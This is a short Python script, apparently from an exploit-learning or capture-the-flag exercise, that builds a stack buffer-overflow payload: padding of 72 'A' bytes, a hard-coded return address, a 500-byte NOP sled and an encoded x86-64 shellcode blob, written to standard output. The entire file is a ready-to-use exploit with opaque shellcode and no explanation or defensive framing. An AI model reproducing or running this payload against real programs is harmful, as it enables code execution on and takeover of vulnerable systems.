#!/usr/bin/python

import struct
import sys

offset = 64 + 8
address = struct.pack("Q", 0x7fffffffe100)
nop_sled = b'\x90' * 500
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x29\xf6\xa1\x2a\x66\x7c\x1b"
buf += b"\xc2\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x43\xcd\xf9\xb3\x2e\xc7\x34\xa0\x40\x98\x8e\x59\x0e"
buf += b"\x7c\x48\x8a\xa0\x11\xc9\x07\x05\x7c\x1b\x8a\xa0\x10"
buf += b"\xf3\xc2\x6e\x7c\x1b\xc2\x06\x94\xc8\x44\x49\x0f\x73"
buf += b"\xc2\x7f\xa1\xe9\xa3\x80\x73\x1e\xc2"
payload = (b'A' * offset) + address + nop_sled + buf
sys.stdout.buffer.write(payload)
# with open('payload.hex', 'wb') as f:
#     f.write(payload)
